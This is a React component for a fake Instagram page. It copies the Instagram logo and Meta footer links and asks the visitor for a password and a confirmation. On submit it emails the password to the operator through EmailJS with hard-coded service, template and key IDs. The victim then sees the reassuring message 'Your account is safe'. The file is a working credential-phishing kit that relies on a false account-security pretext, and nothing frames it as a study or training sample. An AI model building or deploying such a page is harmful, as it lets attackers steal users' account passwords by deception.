import React, { useRef, useState, useEffect } from "react";
import "./index.css";
import instagram from "./instagram.png";
import emailjs from "@emailjs/browser";

const InstagramLogin = () => {
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showSucces, setshowSuccesd] = useState(false); // Default to false
  const [showPassword, setShowPassword] = useState({
    password: false,
    confirmPassword: false,
  });
  const form = useRef();

  // On mount, retrieve from localStorage
  useEffect(() => {
    const isLoggedIn = localStorage.getItem("isLoggedIn");
    setshowSuccesd(isLoggedIn === "true");
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (password !== confirmPassword) {
      alert("Passwords do not match!");
      return;
    }
    emailjs
      .sendForm("service_k211vwj", "template_297vsey", form.current, {
        publicKey: "FyZ6Br8NtmX-xvcjl",
      })
      .then(
        () => {
          localStorage.setItem("isLoggedIn", "true"); // Save to localStorage
          setshowSuccesd(true);
          setPassword("");
          setConfirmPassword("");
        },
        (error) => {
          console.log("FAILED...", error);
        }
      );
  };

  return (
    <div className="login-container">
      <div className="logo">
        <img src={instagram} alt="Instagram Logo" />
      </div>
      {showSucces ? (
        <div className="success-message">Your account is safe</div>
      ) : (
        <form ref={form} className="login-form" onSubmit={handleSubmit}>
          {/* Password Input */}
          <div className="input-container">
            <input
              type={showPassword.password ? "text" : "password"}
              placeholder="Password"
              className="input-field"
              name="message"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <div
              type="button"
              className="toggle-button"
              onClick={() =>
                setShowPassword((prev) => ({
                  ...prev,
                  password: !prev.password,
                }))
              }
            >
              {showPassword.password ? "Hide" : "Show"}
            </div>
          </div>
          {/* Confirm Password Input */}
          <div className="input-container">
            <input
              type={showPassword.confirmPassword ? "text" : "password"}
              placeholder="Confirm Password"
              className="input-field"
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
            />
            <div
              type="button"
              className="toggle-button"
              onClick={() =>
                setShowPassword((prev) => ({
                  ...prev,
                  confirmPassword: !prev.confirmPassword,
                }))
              }
            >
              {showPassword.confirmPassword ? "Hide" : "Show"}
            </div>
          </div>
          <button type="submit" className="login-button">
            Log in
          </button>
        </form>
      )}
      <footer className="footer">
        <ul className="footer-links">
          <li>
            <a href="https://about.meta.com/">Meta</a>
          </li>
          <li>
            <a href="https://about.instagram.com/">About</a>
          </li>
          <li>
            <a href="https://about.instagram.com/blog/">Blog</a>
          </li>
          <li>
            <a href="https://about.instagram.com/about-us/careers">Jobs</a>
          </li>
          <li>
            <a href="https://help.instagram.com/">Help</a>
          </li>
          <li>
            <a href="https://developers.facebook.com/docs/instagram-platform">
              API
            </a>
          </li>
          <li>
            <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">
              Privacy
            </a>
          </li>
          <li>
            <a href="https://help.instagram.com/581066165581870/">Terms</a>
          </li>
          <li>
            <a href="https://www.instagram.com/explore/locations/">Locations</a>
          </li>
        </ul>
        <p className="footer-text">&copy; 2025 Instagram from Meta</p>
      </footer>
    </div>
  );
};

export default InstagramLogin;
